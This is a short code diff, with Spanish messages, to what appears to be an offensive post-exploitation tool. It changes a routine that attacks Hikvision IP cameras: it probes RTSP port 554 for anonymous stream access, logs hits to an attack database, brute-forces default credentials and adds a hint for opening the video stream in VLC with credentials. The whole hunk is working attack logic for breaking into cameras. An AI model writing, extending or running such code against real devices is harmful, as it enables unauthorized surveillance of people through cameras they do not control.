@@ -3899,10 +3899,17 @@ def post_explotacion():
 
             # Primero probar acceso anónimo
             anon_code = _rtsp_probe(ip, 554, rtsp_paths[0])
-            if anon_code == 200:
+            if anon_code == -1:
+                warn(f"No se pudo conectar al puerto 554. RTSP inaccesible.")
+                return False
+            elif anon_code == 200:
                 ok(f"RTSP ANONIMO accesible: rtsp://{ip}:554{rtsp_paths[0]}")
                 db_log_attack("Hikvision RTSP", ip, "", "", "acceso anónimo")
                 return True
+            elif anon_code == 401:
+                info(f"RTSP responde 401 — cámara conectada, requiere credenciales. Probando {len(rtsp_creds)} combinaciones...")
+            else:
+                info(f"RTSP responde código {anon_code} — continuando brute force...")
 
             # Brute force con credenciales
             rtsp_ok = False
@@ -3920,7 +3927,9 @@ def post_explotacion():
                 if rtsp_ok:
                     break
             if not rtsp_ok:
-                warn(f"RTSP: ninguna credencial por defecto funcionó. Cámara protegida.")
+                warn(f"RTSP: ninguna credencial por defecto funcionó.")
+                info(f"La cámara tiene contraseña personalizada. Para acceder al stream usa:")
+                info(f"  vlc rtsp://USUARIO:CLAVE@{ip}:554/Streaming/Channels/101")
             return rtsp_ok
 
         if "200" in resp or "OK" in resp:
